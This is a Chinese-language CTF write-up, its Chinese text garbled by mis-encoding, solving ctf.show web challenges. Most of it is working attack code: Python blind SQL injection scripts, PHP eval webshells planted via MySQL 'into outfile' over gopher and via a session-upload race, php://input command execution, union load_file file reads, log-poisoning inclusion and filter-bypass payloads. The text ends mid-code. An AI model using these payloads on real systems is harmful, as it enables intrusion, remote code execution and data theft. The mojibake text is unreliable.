tcpdumpç›‘å¬loç½‘å¡3306ç«¯å£æµé‡ï¼Œä¿å­˜åœ¨æ–‡ä»¶é‡Œ 1tcpdump -i lo port 3306 -w mysql.pacp ç„¶åæ‰§è¡Œ 1mysql -u root -h 127.0.0.1 åœ¨sqlå‘½ä»¤è¡Œæ‰§è¡Œ 12select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile &quot;/var/www/html/moonback.php&quot;;exit ç„¶åwiresharkæ‰“å¼€ï¼Œè¿½è¸ªtcpæµ é€‰æ‹©åŸå§‹æ•°æ®ï¼Œä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œhxdæ‰“å¼€æŠŠ16è¿›åˆ¶å¤åˆ¶åˆ°txtä¸­ï¼Œç„¶åç©ºæ ¼æ›¿æ¢%å·ï¼Œåˆ«å¿˜äº†ç¬¬ä¸€ä¸ªå¢åŠ % ç„¶åå°±å¯ä»¥å‘é€ç»™æœåŠ¡ç«¯äº†ï¼Œæ³¨æ„è¦urlç¼–ç ä¸€æ¬¡ common-gopher-tcp-streamgithubåœ°å€ï¼šhttps://github.com/firebroo/sec_tools/tree/master/common-gopher-tcp-stream è¿™ä¸ªå·¥å…·ç›´æ¥æŠŠç¼–ç åçš„æ˜¾ç¤ºå‡ºæ¥äº†ï¼Œå¾ˆæ–¹ä¾¿ ä¸‹è½½ä¸‹æ¥é¦–å…ˆmakeç¼–è¯‘ä¸€ä¸‹ ç„¶åç›‘å¬,ç«¯å£å’Œ-på¿…é¡»æŒ¨ç€ 1./sniffer -p3306 æ¥ç€å’Œä¸Šé¢ä¸€æ · 123mysql -u root -h 127.0.0.1select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile &quot;/var/www/html/moonback.php&quot;;exit ç„¶åæäº¤çš„æ—¶å€™æ³¨æ„urlå†ç¼–ç ä¸€æ¬¡å°±è¡Œ ä»”ç»†çœ‹äº†çœ‹å‘ç°é™¤äº†å¤§å°å†™ï¼Œä¸¤ä¸ªæµé‡æ²¡å•¥å·®åˆ«ï¼Œéƒ½æ˜¯16è¿›åˆ¶ï¼Œå¤§å°å†™æ— æ‰€è°“ Gopherusgithubåœ°å€ï¼šhttps://github.com/tarunkant/Gopherus ç›´æ¥ç”¨å·¥å…·ç”Ÿæˆä¹Ÿè¡Œï¼Œæ³¨æ„urlç¼–ç ,æˆ‘çœŸåƒåœ¾ webweb2å¸ƒå°”ç›²æ³¨ï¼Œæ²¡å•¥è¿‡æ»¤ï¼Œç›´æ¥è·‘ï¼Œexp: 12345678910111213141516171819202122232425262728import requestsurl=&quot;http://783dfdd8-9d2e-4e68-b3df-e1b718d4a572.chall.ctf.show/&quot;flag=&#x27;&#x27;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 data=&#123;&#x27;username&#x27;:&quot;admin&#x27; or if(ascii(substr((select flag from web2.flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)),&#x27;password&#x27;:&#x27;admin&#x27;&#125; data1=&#123;&#x27;username&#x27;:&quot;admin&#x27; or if(ascii(substr((select flag from web2.flag),&#123;&#125;,1))=&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)),&#x27;password&#x27;:&#x27;admin&#x27;&#125; try: r1=requests.post(url,data=data1) print(i,mid) if &#x27;ctfshow&#x27; in r1.text: flag+=chr(mid) print(flag) break r=requests.post(url,data=data) if &#x27;ctfshow&#x27; in r.text: low=mid+1 else: top=mid-1 except Exception as e: pass if flag==f1: break web3allow_url_fopenå’Œallow_url_includeéƒ½å¼€å¯äº†ï¼Œç›´æ¥php://input 123?url&#x3D;php:&#x2F;&#x2F;inputPOST: &lt;?php system(&#39;cat ctf_go_go_go &#39;); web4è¿‡æ»¤äº†phpï¼Œç›´æ¥session_upload_progress GETshell 12345678910111213141516171819202122232425262728import requestsimport threadingurl=&#x27;http://5c452cf4-fc3f-45c0-a872-3e818ec53c43.chall.ctf.show/&#x27;r=requests.session()headers=&#123; &quot;Cookie&quot;:&#x27;PHPSESSID=mb&#x27;&#125;def POST(): files=&#123; &quot;upload&quot;:&#x27;&#x27; #ä¸Šä¼ æ— æ•ˆçš„ç©ºæ–‡ä»¶ &#125; data=&#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&lt;?php echo &quot;moonback&quot;;file_put_contents(&quot;/tmp/mb&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));?&gt;&#x27; #æ¶æ„è¿›åº¦ä¿¡æ¯ï¼Œreadfileå°†ç›´æ¥è¾“å‡ºæ–‡ä»¶å†…å®¹ &#125; r.post(url,files=files,headers=headers,data=data)def READ(): while True: POST() t=r.get(&quot;http://5c452cf4-fc3f-45c0-a872-3e818ec53c43.chall.ctf.show/?url=/tmp/sess_mb&quot;) if &#x27;moonback&#x27; in t.text: print(&#x27;[+] ok&#x27;) else: continuefor i in range(50): threading.Thread(target=READ,args=()).start() web5æºç ï¼š 12345678910111213141516171819&lt;?php$flag=&quot;&quot;;$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];if(isset($v1) &amp;&amp; isset($v2))&#123; if(!ctype_alpha($v1))&#123; die(&quot;v1 error&quot;); &#125; if(!is_numeric($v2))&#123; die(&quot;v2 error&quot;); &#125; if(md5($v1)==md5($v2))&#123; echo $flag; &#125;&#125;else&#123; echo &quot;where is flag?&quot;;&#125;?&gt; md5å¼±æ¯”è¾ƒï¼Œpayload 1?v1&#x3D;QNKCDZO&amp;v2&#x3D;240610708 web6å°±æ¯”web2å¤šè¿‡æ»¤ä¸ªç©ºæ ¼ 12345678910111213141516171819202122232425262728import requestsurl=&quot;http://7d7d60c5-b0fa-498e-842e-c12ef1378f0b.chall.ctf.show/&quot;flag=&#x27;&#x27;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 data=&#123;&#x27;username&#x27;:&quot;admin&#x27;/**/or/**/if(ascii(substr((select/**/flag/**/from/**/web2.flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)),&#x27;password&#x27;:&#x27;admin&#x27;&#125; data1=&#123;&#x27;username&#x27;:&quot;admin&#x27;/**/or/**/if(ascii(substr((select/**/flag/**/from/**/web2.flag),&#123;&#125;,1))=&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)),&#x27;password&#x27;:&#x27;admin&#x27;&#125; try: r1=requests.post(url,data=data1) print(i,mid) if &#x27;ctfshow&#x27; in r1.text: flag+=chr(mid) print(flag) break r=requests.post(url,data=data) if &#x27;ctfshow&#x27; in r.text: low=mid+1 else: top=mid-1 except Exception as e: pass if flag==f1: break web7æ•°å­—å‹å¸ƒå°”æ³¨å…¥ï¼Œè¿‡æ»¤ç©ºæ ¼ 12345678910111213141516171819202122232425262728import requestsurl&#x3D;&quot;http:&#x2F;&#x2F;e3a532c0-bca9-4abc-a724-1adb2b991432.chall.ctf.show&#x2F;index.php?id&#x3D;&quot;flag&#x3D;&#39;&#39;for i in range(1,50): f1&#x3D;flag top&#x3D;127 low&#x3D;33 while low&lt;&#x3D;top: mid&#x3D;(top+low)&#x2F;&#x2F;2 p1&#x3D;&quot;if(ascii(substr((select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;web7.flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)) p2&#x3D;&quot;if(ascii(substr((select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;web7.flag),&#123;&#125;,1))&#x3D;&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)) try: r1&#x3D;requests.get(url+p2) print(i,mid) if &#39;pitch-and-toss,&#39; in r1.text: flag+&#x3D;chr(mid) print(flag) break r&#x3D;requests.get(url+p1) if &#39;pitch-and-toss,&#39; in r.text: low&#x3D;mid+1 else: top&#x3D;mid-1 except Exception as e: pass if flag&#x3D;&#x3D;f1: break web8è¿‡æ»¤ç©ºæ ¼å¯ä»¥ç”¨/**/ï¼Œè¿‡æ»¤ifç”¨case when 1=1 then 1 else 0 endï¼Œè¿‡æ»¤é€—å·ç”¨from 1 for 1æˆªå– 12345678910111213141516171819202122232425262728import requestsurl=&quot;http://9f999441-8cb2-4663-9f55-195bbfafe615.chall.ctf.show/index.php?id=&quot;flag=&#x27;&#x27;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 p1=&quot;(case/**/when/**/(ascii(substr((select/**/flag/**/from/**/web8.flag)/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)&quot;.format(str(i),str(mid)) p2=&quot;(case/**/when/**/(ascii(substr((select/**/flag/**/from/**/web8.flag)/**/from/**/&#123;&#125;/**/for/**/1))=&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)&quot;.format(str(i),str(mid)) try: r1=requests.get(url+p2) print(i,mid) if &#x27;pitch-and-toss,&#x27; in r1.text: flag+=chr(mid) print(flag) break r=requests.get(url+p1) if &#x27;pitch-and-toss,&#x27; in r.text: low=mid+1 else: top=mid-1 except Exception as e: pass if flag==f1: break web9è®¿é—®/robots.txtçœ‹åˆ°index.phpsï¼Œæºç ï¼š 123456789101112131415&lt;?php$flag=&quot;&quot;;$password=$_POST[&#x27;password&#x27;];if(strlen($password)&gt;10)&#123;die(&quot;password error&quot;);&#125;$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;$result=mysqli_query($con,$sql);if(mysqli_num_rows($result)&gt;0)&#123;while($row=mysqli_fetch_assoc($result))&#123;echo &quot;ç™»é™†æˆåŠŸ&lt;br&gt;&quot;;echo $flag;&#125;&#125;?&gt; javisojä¸Šçš„ä¸€é“é¢˜ï¼Œè¯¦ç»†å‚è€ƒï¼šhttps://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#Login ç›´æ¥ 1admin:ffifdyop web10åŒæ ·è®¿é—®index.phpså¾—åˆ°æºç  12345678910111213141516171819202122232425262728&lt;?php$flag=&quot;&quot;;function replaceSpecialChar($strParam)&#123; $regex = &quot;/(select|from|where|join|sleep|and|\\s|union|,)/i&quot;; return preg_replace($regex,&quot;&quot;,$strParam);&#125;if (!$con)&#123; die(&#x27;Could not connect: &#x27; . mysqli_error());&#125;if(strlen($username)!=strlen(replaceSpecialChar($username)))&#123; die(&quot;sql inject error&quot;);&#125;if(strlen($password)!=strlen(replaceSpecialChar($password)))&#123; die(&quot;sql inject error&quot;);&#125;$sql=&quot;select * from user where username = &#x27;$username&#x27;&quot;;$result=mysqli_query($con,$sql); if(mysqli_num_rows($result)&gt;0)&#123; while($row=mysqli_fetch_assoc($result))&#123; if($password==$row[&#x27;password&#x27;])&#123; echo &quot;ç™»é™†æˆåŠŸ&lt;br&gt;&quot;; echo $flag; &#125; &#125; &#125;?&gt; æ¯”è¾ƒäº†æ›¿æ¢åçš„é•¿åº¦å’ŒåŸæ¥çš„é•¿åº¦ï¼Œä¸ç›¸ç­‰å°±é€€å‡ºç¨‹åºï¼Œè¿™é‡Œæœ‰ä¸ªå°trick group byå¾ˆå¥½ç†è§£ï¼Œæ ¹æ®æŸä¸ªå­—æ®µåˆ†ç»„å˜›ï¼ŒåŠ ä¸ŠWITH ROLLUPçš„æ„æ€å°±æ˜¯åœ¨groupåˆ†ç»„å­—æ®µçš„åŸºç¡€ä¸Šå†è¿›è¡Œç»Ÿè®¡æ•°æ®ï¼Œè¿™æ—¶å°±ä¼šå¤šå‡ºä¸€ä¸ªNULLå€¼ å¯¹äºè¿™é“é¢˜ï¼Œæˆ‘ä»¬åªéœ€ç”¨ä¸Šè¿™ä¸ªç‚¹å¹¶ä¸”è®¾ç½®passwordä¸ºç©ºå°±å¯ä»¥ç™»é™†ï¼Œç”±äºè¿‡æ»¤äº†ç©ºæ ¼éœ€è¦ 1admin&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;password&#x2F;**&#x2F;with&#x2F;**&#x2F;rollup# NULLå¼±ç­‰äºç©ºå­—ç¬¦ä¸²ï¼Œç™»é™†æˆåŠŸ web11æºç ï¼š 1234567891011121314&lt;?phpfunction replaceSpecialChar($strParam)&#123; $regex = &quot;/(select|from|where|join|sleep|and|\\s|union|,)/i&quot;; return preg_replace($regex,&quot;&quot;,$strParam);&#125;if(strlen($password)!=strlen(replaceSpecialChar($password)))&#123; die(&quot;sql inject error&quot;);&#125;if($password==$_SESSION[&#x27;password&#x27;])&#123; echo $flag;&#125;else&#123; echo &quot;error&quot;;&#125;?&gt; passwordå­˜åœ¨äºsessionä¸­ï¼Œåªéœ€æŒ‡å®šä¸€ä¸ªä¸å­˜åœ¨çš„session idï¼Œpasswordè®¾ç½®æˆç©ºå°±è¡Œï¼ŒåŒæ ·æ˜¯NULLå¼±ç­‰äºç©ºå­—ç¬¦ web12æŸ¥çœ‹æºç ï¼Œæç¤º?cmd=ï¼Œç¬¬ä¸€æ¬¡ä»¥ä¸ºæ˜¯å‘½ä»¤æ‰§è¡Œï¼ŒæŸ¥çœ‹phpinfo: 1?cmd&#x3D;phpinfo(); æŸ¥çœ‹æºç : 1234// ?cmd=show_source(&#x27;/var/www/html/index.php&#x27;);&lt;?php$cmd=$_GET[&#x27;cmd&#x27;];eval($cmd); æŸ¥æ‰¾ç›®å½•,è¯»å–æ–‡ä»¶ï¼š 12?cmd&#x3D;var_dump(scandir(&#39;.&#x2F;&#39;));?cmd&#x3D;show_source(&#39;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#39;); ä¸çŸ¥é“ä¸ºå•¥ä¸è¿‡æ»¤scandirï¼Œè¿‡æ»¤äº†å¯ä»¥ç”¨globåè®®ç»•è¿‡ 1print_r(glob(&quot;*&quot;)); web13.user.iniç»•è¿‡ï¼Œè¯¦ç»†å‚è€ƒï¼šhttps://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#SUCTF-2019-CheckIn è´´ä¸€ä¸‹æºç ï¼š 1234567891011121314151617181920212223242526272829&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); $filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; $temp_name = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]; $size = $_FILES[&#x27;file&#x27;][&#x27;size&#x27;]; $error = $_FILES[&#x27;file&#x27;][&#x27;error&#x27;]; $arr = pathinfo($filename); $ext_suffix = $arr[&#x27;extension&#x27;]; if ($size &gt; 24)&#123; die(&quot;error file zise&quot;); &#125; if (strlen($filename)&gt;9)&#123; die(&quot;error file name&quot;); &#125; if(strlen($ext_suffix)&gt;3)&#123; die(&quot;error suffix&quot;); &#125; if(preg_match(&quot;/php/i&quot;,$ext_suffix))&#123; die(&quot;error suffix&quot;); &#125; if(preg_match(&quot;/php/i&quot;,$filename))&#123; die(&quot;error file name&quot;); &#125; if (move_uploaded_file($temp_name, &#x27;./&#x27;.$filename))&#123; echo &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;; &#125;else&#123; echo &quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;; &#125; ?&gt; web14æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546 &lt;?phpinclude(&quot;secret.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = intval($_GET[&#x27;c&#x27;]); sleep($c); switch ($c) &#123; case 1: echo &#x27;$url&#x27;; break; case 2: echo &#x27;@A@&#x27;; break; case 555555: echo $url; case 44444: echo &quot;@A@&quot;; break; case 3333: echo $url; break; case 222: echo &#x27;@A@&#x27;; break; case 222: echo &#x27;@A@&#x27;; break; case 3333: echo $url; break; case 44444: echo &#x27;@A@&#x27;; case 555555: echo $url; break; case 3: echo &#x27;@A@&#x27;; case 6000000: echo &quot;$url&quot;; case 1: echo &#x27;@A@&#x27;; break; &#125;&#125;highlight_file(__FILE__); ç”±äºswitchæ²¡æœ‰ç¢°åˆ°breakæ—¶ä¼šä¸€ç›´å¾€ä¸‹æ‰§è¡Œï¼Œç›´æ¥è®©cç­‰äº3å°±èƒ½è¾“å‡º$urlï¼Œè®¿é—®ï¼ŒæŸ¥çœ‹æºç ï¼š 123if(preg_match(&#x27;/information_schema\\.tables|information_schema\\.columns|linestring| |polygon/is&#x27;, $_GET[&#x27;query&#x27;]))&#123; die(&#x27;@A@&#x27;);&#125; å’Œweb7å·®ä¸å¤šï¼Œè·‘äº†ä¸‹ç‰ˆæœ¬å‘ç°æ˜¯ï¼š10.2.26-MariaDB-logï¼Œæ‰€æœ‰æ•°æ®åº“ï¼š 1information_schema,mysql,performance_schema,web å¯ä»¥é€šè¿‡information_schemaä¸­çš„å…¶ä»–è¡¨æ¥bypassï¼Œè¯¦ç»†å‚è€ƒï¼šhttps://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb 12345//çˆ†è¡¨SELECT/**/group_concat(TABLE_NAME)/**/FROM/**/information_schema.KEY_COLUMN_USAGE/**/WHERE/**/table_schema=DATABASE()//çˆ†ç¬¬ä¸€åˆ—SELECT/**/group_concat(COLUMN_NAME)/**/FROM/**/information_schema.KEY_COLUMN_USAGE/**/WHERE/**/table_schema=DATABASE()/**/and/**/table_name=&#x27;content&#x27; å‰©ä¸‹çš„å°±è¦æ— åˆ—åæ³¨å…¥äº†ï¼Œéœ€è¦å…ˆçŒœåˆ—æ•°ï¼Œexpï¼š 12345678910111213141516171819202122232425262728import requestsurl=&quot;http://fbae9ee1-b59d-4b25-a39d-0e4af175f5da.chall.ctf.show/here_1s_your_f1ag.php?query=&quot;flag=&#x27;&#x27;for i in range(1,50): f1=flag top=127 low=32 while low&lt;=top: mid=(top+low)//2 p1=&quot;if(ascii(substr((select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)a),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)) p2=&quot;if(ascii(substr((select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)a),&#123;&#125;,1))=&#123;&#125;,1,0)#&quot;.format(str(i),str(mid)) try: r1=requests.get(url+p2) print(i,mid) if &#x27;admin&#x27; in r1.text: flag+=chr(mid) print(flag) break r=requests.get(url+p1) if &#x27;admin&#x27; in r.text: low=mid+1 else: top=mid-1 except Exception as e: pass if flag==f1: break è·‘å‡ºæ¥flagä¸åœ¨è¿™ï¼Œå…¶å®é‚£ä¸ªè¿‡æ»¤å¾ˆé¸¡è‚‹ï¼Œç›´æ¥åå¼•å·å°±å¯ä»¥ç»•è¿‡ï¼Œå¹¶ä¸”å¯ä»¥è”åˆæŸ¥è¯¢ï¼Œæ²™é›•äº†ï¼ 123?query&#x3D;1&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;1%23?query&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;here_1s_your_f1ag.php&#39;)%23 here_1s_your_f1ag.phpæºç ï¼š 12345678910111213141516&lt;?phpinclude(&quot;config.php&quot;);$db = new sql();if(isset($_GET[&#x27;query&#x27;]) &amp;&amp; $_GET[&#x27;query&#x27;] !== &#x27;&#x27;)&#123; $id = $_GET[&#x27;query&#x27;]; if(preg_match(&#x27;/information_schema\\.tables|information_schema\\.columns|linestring| |polygon/is&#x27;, $_GET[&#x27;query&#x27;]))&#123; die(&#x27;@A@&#x27;); &#125;&#125;else&#123; $id = 1;&#125;$sql_ = &quot;select username from content where id=$id&quot;;$db = new sql();echo &quot;&lt;script&gt;alert(&#x27;&quot;.$db-&gt;getone($sql_)[0].&quot;&#x27;) é€šè¿‡æŸ¥çœ‹secret.phpå¾—åˆ°flagçš„ä½ç½®ï¼Œè¯»flag 1?query&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;load_file(&#39;&#x2F;real_flag_is_here&#39;)%23 web15 FishmanWEB_ç»™ä½ shell_36Dæ¯æŸ¥çœ‹æºç å‘ç°?view_sourceï¼Œå¾—åˆ°æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php//It&#x27;s no need to use scanner. Of course if you want, but u will find nothing.error_reporting(0);include &quot;config.php&quot;;if (isset($_GET[&#x27;view_source&#x27;])) &#123; show_source(__FILE__); die;&#125;function checkCookie($s) &#123; $arr = explode(&#x27;:&#x27;, $s); if ($arr[0] === &#x27;&#123;&quot;secret&quot;&#x27; &amp;&amp; preg_match(&#x27;/^[\\&quot;0-9A-Z]*&#125;$/&#x27;, $arr[1]) &amp;&amp; count($arr) === 2 ) &#123; return true; &#125; else &#123; if ( !theFirstTimeSetCookie() ) setcookie(&#x27;secret&#x27;, &#x27;&#x27;, time()-1); return false; &#125;&#125;function haveFun($_f_g) &#123; $_g_r = 32; $_m_u = md5($_f_g); $_h_p = strtoupper($_m_u); for ($i = 0; $i &lt; $_g_r; $i++) &#123; $_i = substr($_h_p, $i, 1); $_i = ord($_i); print_r($_i &amp; 0xC0); &#125; die;&#125;isset($_COOKIE[&#x27;secret&#x27;]) ? $json = $_COOKIE[&#x27;secret&#x27;] : setcookie(&#x27;secret&#x27;, &#x27;&#123;&quot;secret&quot;:&quot;&#x27; . strtoupper(md5(&#x27;y1ng&#x27;)) . &#x27;&quot;&#125;&#x27;, time()+7200 );checkCookie($json) ? $obj = @json_decode($json, true) : die(&#x27;no&#x27;);if ($obj &amp;&amp; isset($_GET[&#x27;give_me_shell&#x27;])) &#123; ($obj[&#x27;secret&#x27;] != $flag_md5 ) ? haveFun($flag) : echo &quot;here is your webshell: $shell_path&quot;;&#125;die; å…ˆçœ‹ä¸‹haveFunå‡½æ•°ï¼Œè¾“å‡º$_i &amp; 0xC0ï¼Œ0xC0äºŒè¿›åˆ¶å½¢å¼11000000ï¼Œç”±äºæ•°å­—çš„asciiç èŒƒå›´ä¸º48-57ï¼Œå¤§å†™å­—æ¯çš„asciiç èŒƒå›´65-90ï¼Œå°å†™å­—æ¯çš„èŒƒå›´97-122 å› æ­¤ä¸è¿ç®—çš„ç»“æœåªæœ‰ä¸¤ç§: 1200000000 &#x3D;&#x3D;&gt; 001000000 &#x3D;&#x3D;&gt; 64 å¹¶ä¸”ä¸ºæ•°å­—çš„æ—¶å€™ç”±äºasciiå°äº64ï¼Œå› æ­¤è®¡ç®—ç»“æœä¸º0ï¼ŒåŒç†ï¼Œä¸ºå¤§å°å†™å­—æ¯æ—¶è®¡ç®—ç»“æœä¸º64 ç”±è¿”å›ç»“æœï¼š 10006464640064064646464006406464064640064006400000000000 md5å‰ä¸‰ä¸ªå­—ç¬¦å‡ä¸ºæ•°å­—ï¼Œåˆï¼š 12$obj[&#x27;secret&#x27;] != $flag_md5// 123==&#x27;123a&#x27; æ¯”è¾ƒæ˜¯å¼±æ¯”è¾ƒï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨å¼±ç±»å‹ç»•è¿‡ï¼Œå°è¯•çˆ†ç ´ï¼š æ³¨æ„ä¸èƒ½æ˜¯ï¼š 1&#123;&quot;secret&quot;:&quot;115&quot;&#125; è®¿é—®å¾—åˆ°æºç ï¼š 123456789101112131415161718192021222324252627282930 &lt;?phperror_reporting(0);session_start();//there are some secret waf that you will never know, fuzz me if you canrequire &quot;hidden_filter.php&quot;;if (!$_SESSION[&#x27;login&#x27;]) die(&#x27;&lt;script&gt;location.href=\\&#x27;./index.php\\&#x27;&lt;/script&gt;&#x27;);if (!isset($_GET[&#x27;code&#x27;])) &#123; show_source(__FILE__); exit();&#125; else &#123; $code = $_GET[&#x27;code&#x27;]; if (!preg_match($secret_waf, $code)) &#123; //æ¸…ç©ºsession ä»å¤´å†æ¥ eval(&quot;\\$_SESSION[&quot; . $code . &quot;]=false;&quot;); //you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker &#125; else die(&#x27;hacker&#x27;);&#125;/* * When you feel that you are lost, do not give up, fight and move on. * Being a hacker is not easy, it requires effort and sacrifice. * But remember â€¦ we are legion! * â€”â€”â€”â€”Deep CTF 2020*/ fuzzä¸€ä¸‹ï¼Œå‘ç°ä¸‹é¢çš„éƒ½ä¸èƒ½ç”¨äº† 1&#96; ; include &#39; &quot; å¯ä»¥ç”¨çŸ­æ ‡ç­¾ï¼Œä»¥ä¸‹å‡å¯ä»¥æ­£å¸¸å…è®¸ 1234567&lt;?=phpinfo();&lt;?echo 123?&gt;&lt;?=`ls`?&gt; payload: 1?code&#x3D;1]&#x3D;1?&gt;&lt;?&#x3D;require~%D0%99%93%9E%98?&gt; WEB_RemoteImageDownloader_36DWEB_ALL_INFO_U_WANT_36Dæ‰«ç›®å½•å‘ç°index.php.bak 12345678910111213141516171819202122phpvisit all_info_u_want.php and you will get all information you want= =Thinking that it may be difficult, i decided to show you the source code:&lt;?phperror_reporting(0);//give you all information you wantif (isset($_GET[&#x27;all_info_i_want&#x27;])) &#123; phpinfo();&#125;if (isset($_GET[&#x27;file&#x27;])) &#123; $file = &quot;/var/www/html/&quot; . $_GET[&#x27;file&#x27;]; //really baby include include($file);&#125;?&gt;really really really baby challenge right? è®¿é—®åŒ…å«flagæç¤ºæ˜¯å‡çš„ï¼Œå°è¯•getshellï¼Œé¢„æœŸè§£æ˜¯åŒ…å«/var/log/nginx/access.logï¼ŒæŠŠä¸€å¥è¯æ”¾åœ¨è¯·æ±‚å¤´é‡ŒåŒ…å«èšå‰‘è¿ 1grep -r -l &quot;flag&quot; /etc æ‰¾åˆ°/etc/opt/secret/what_you_want å¦å¤–ä¸€ç§åŠæ³•æ˜¯åŒ…å«è‡ªèº«ï¼Œæ„é€ ï¼š 12345678910111213&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://591caabf-a243-4850-8254-3c4f913b12e2.chall.ctf.show/all_info_u_want.php?file=all_info_u_want.php&amp;all_info_i_want&quot; method=&quot;post&quot;enctype=&quot;multipart/form-data&quot;&gt;&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; WEB_WUSTCTFæœ´å®æ— åRevenge_36Dæ¯æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475 &lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);function isPalindrome($str)&#123; $len=strlen($str); $l=1; $k=intval($len/2)+1; for($j=0;$j&lt;$k;$j++) if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) &#123; $l=0; break; &#125; if ($l==1) return true; else return false;&#125;//level 1if (isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; $numPositve = intval($num); $numReverse = intval(strrev($num)); if (preg_match(&#x27;/[^0-9.-]/&#x27;, $num)) &#123; die(&quot;éæ´²æ¬¢è¿ä½ 1&quot;); &#125; if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) &#123; //åœ¨64ä½ç³»ç»Ÿä¸­ intval()çš„ä¸Šé™ä¸æ˜¯2147483647 çœçœå§ die(&quot;éæ´²æ¬¢è¿ä½ 2&quot;); &#125; if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123; echo &quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;; &#125;else&#123; die(&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;); &#125;&#125;else&#123; die(&quot;å»éæ´²å§&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123; $md5=$_GET[&#x27;md5&#x27;]; if ($md5==md5(md5($md5))) echo &quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;; else die(&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;);&#125;else&#123; die(&quot;å»éæ´²å§&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123; $get_flag = $_GET[&#x27;get_flag&#x27;]; if(!strstr($get_flag,&quot; &quot;))&#123; $get_flag = str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, 